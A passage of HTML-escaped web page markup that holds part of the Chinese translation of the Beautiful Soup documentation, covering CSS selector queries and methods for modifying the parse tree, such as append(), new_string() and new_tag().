id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;[class~=sister]&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过tag的id查找:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;#link1&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;a#link2&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过是否存在某个属性来查找:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;apos;a[href]&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过属性的值来查找:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;apos;a[href=&amp;quot;http://example.com/elsie&amp;quot;]&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;apos;a[href^=&amp;quot;http://example.com/&amp;quot;]&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;apos;a[href$=&amp;quot;tillie&amp;quot;]&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;apos;a[href*=&amp;quot;.com/el&amp;quot;]&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过语言设置来查找:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;multilingual_markup = &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;p lang=&amp;quot;en&amp;quot;&amp;gt;Hello&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;p lang=&amp;quot;en-us&amp;quot;&amp;gt;Howdy, y&amp;apos;all&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;p lang=&amp;quot;en-gb&amp;quot;&amp;gt;Pip-pip, old fruit&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;p lang=&amp;quot;fr&amp;quot;&amp;gt;Bonjour mes amis&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;multilingual_soup = BeautifulSoup(multilingual_markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;multilingual_soup.select(&amp;apos;p[lang|=en]&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;p lang=&amp;quot;en&amp;quot;&amp;gt;Hello&amp;lt;/p&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;p lang=&amp;quot;en-us&amp;quot;&amp;gt;Howdy, y&amp;apos;all&amp;lt;/p&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;p lang=&amp;quot;en-gb&amp;quot;&amp;gt;Pip-pip, old fruit&amp;lt;/p&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对于熟悉CSS选择器语法的人来说这是个非常方便的方法.Beautiful Soup也支持CSS选择器API,如果你仅仅需要CSS选择器的功能,那么直接使用 &lt;code&gt;lxml&lt;/code&gt; 也可以,而且速度更快,支持更多的CSS选择器语法,但Beautiful Soup整合了CSS选择器的语法和自身方便使用API.&lt;/p&gt;
&lt;h1 id=&quot;修改文档树&quot;&gt;&lt;a href=&quot;#修改文档树&quot; class=&quot;headerlink&quot; title=&quot;修改文档树&quot;&gt;&lt;/a&gt;修改文档树&lt;/h1&gt;&lt;p&gt;Beautiful Soup的强项是文档树的搜索,但同时也可以方便的修改文档树&lt;/p&gt;
&lt;h2 id=&quot;修改tag的名称和属性&quot;&gt;&lt;a href=&quot;#修改tag的名称和属性&quot; class=&quot;headerlink&quot; title=&quot;修改tag的名称和属性&quot;&gt;&lt;/a&gt;修改tag的名称和属性&lt;/h2&gt;&lt;p&gt;在 &lt;a href=&quot;#attributes&quot;&gt;Attributes&lt;/a&gt; 的章节中已经介绍过这个功能,但是再看一遍也无妨. 重命名一个tag,改变属性的值,添加或删除属性:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(&amp;apos;&amp;lt;b class=&amp;quot;boldest&amp;quot;&amp;gt;Extremely bold&amp;lt;/b&amp;gt;&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag = soup.b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag.name = &amp;quot;blockquote&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag[&amp;apos;class&amp;apos;] = &amp;apos;verybold&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag[&amp;apos;id&amp;apos;] = 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;blockquote class=&amp;quot;verybold&amp;quot; id=&amp;quot;1&amp;quot;&amp;gt;Extremely bold&amp;lt;/blockquote&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;del tag[&amp;apos;class&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;del tag[&amp;apos;id&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;blockquote&amp;gt;Extremely bold&amp;lt;/blockquote&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;修改-string&quot;&gt;&lt;a href=&quot;#修改-string&quot; class=&quot;headerlink&quot; title=&quot;修改 .string&quot;&gt;&lt;/a&gt;修改 .string&lt;/h2&gt;&lt;p&gt;给tag的 &lt;code&gt;.string&lt;/code&gt; 属性赋值,就相当于用当前的内容替代了原来的内容:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = &amp;apos;&amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag = soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag.string = &amp;quot;New link text.&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;New link text.&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意: 如果当前的tag包含了其它tag,那么给它的 &lt;code&gt;.string&lt;/code&gt; 属性赋值会覆盖掉原有的所有内容包括子tag&lt;/p&gt;
&lt;h2 id=&quot;append&quot;&gt;&lt;a href=&quot;#append&quot; class=&quot;headerlink&quot; title=&quot;append()&quot;&gt;&lt;/a&gt;append()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Tag.append()&lt;/code&gt; 方法想tag中添加内容,就好像Python的列表的 &lt;code&gt;.append()&lt;/code&gt; 方法:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(&amp;quot;&amp;lt;a&amp;gt;Foo&amp;lt;/a&amp;gt;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.a.append(&amp;quot;Bar&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;a&amp;gt;FooBar&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.a.contents&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [u&amp;apos;Foo&amp;apos;, u&amp;apos;Bar&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;BeautifulSoup-new-string-和-new-tag&quot;&gt;&lt;a href=&quot;#BeautifulSoup-new-string-和-new-tag&quot; class=&quot;headerlink&quot; title=&quot;BeautifulSoup.new_string() 和 .new_tag()&quot;&gt;&lt;/a&gt;BeautifulSoup.new_string() 和 .new_tag()&lt;/h2&gt;&lt;p&gt;如果想添加一段文本内容到文档中也没问题,可以调用Python的 &lt;code&gt;append()&lt;/code&gt; 方法或调用工厂方法 &lt;code&gt;BeautifulSoup.new_string()&lt;/code&gt; :&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(&amp;quot;&amp;lt;b&amp;gt;&amp;lt;/b&amp;gt;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag = soup.b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag.append(&amp;quot;Hello&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;new_string = soup.new_string(&amp;quot; there&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag.append(new_string)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;Hello there.&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag.contents&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [u&amp;apos;Hello&amp;apos;, u&amp;apos; there&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果想要创建一段注释,或 &lt;code&gt;NavigableString&lt;/code&gt; 的任何子类,将子类作为 &lt;code&gt;new_string()&lt;/code&gt; 方法的第二个参数传入:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from bs4 import Comment&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;new_comment = soup.new_string(&amp;quot;Nice to see you.&amp;quot;, Comment)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag.append(new_comment)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;Hello there&amp;lt;!--Nice to see you.--&amp;gt;&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tag.contents&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [u&amp;apos;Hello&amp;apos;, u&amp;apos; there&amp;apos;, u&amp;apos;Nice to see you.&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;这是Beautiful-Soup-4-2-1-中新增的方法&quot;&gt;&lt;a href=&quot;#这是Beautiful-Soup-4-2-1-中新增的方法&quot; class=&quot;headerlink&quot; title=&quot;这是Beautiful Soup 4.2.1 中新增的方法&quot;&gt;&lt;/a&gt;这是Beautiful Soup 4.2.1 中新增的方法&lt;/h1&gt;&lt;p&gt;创建一个tag最好的方法是调用工厂方法 &lt;code&gt;BeautifulSoup.new_tag()&lt;/code&gt; :&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(&amp;quot;&amp;lt;b&amp;gt;&amp;lt;/b&amp;gt;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;original_tag = soup.b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;new_tag = soup.new_tag(&amp;quot;a&amp;quot;, href=&amp;quot;http://www.example.com&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;original_tag.append(new_tag)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;original_tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;&amp;lt;a href=&amp;quot;http://www.example.com&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;new_tag.string = &amp;quot;Link text.&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;original_tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;&amp;lt;a href=&amp;quot;http://www.example.com&amp;quot;&amp;gt;Link text.&amp;lt;/a&amp;gt;&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一个参数作为tag的name,是必填,其它参数选填&lt;/p&gt;
&lt;h2 id=&quot;insert&quot;&gt;&lt;a href=&quot;#insert&quot; class=&quot;headerlink&quot; title=&quot;insert()&quot;&gt;&lt;/a&gt;insert()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Tag.insert()&lt;/code&gt; 方法与 &lt;code&gt;Tag.append()&lt;/code&gt; 方法类似,区别是不会把新元素添加到父节点 &lt;code&gt;.contents&lt;/code&gt; 属性的最后,而是把元素插入到指定的位置.与Python列表总的 &lt;code&gt;.insert()&lt;/code&gt; 方法的用法下同:&lt;/p&gt;
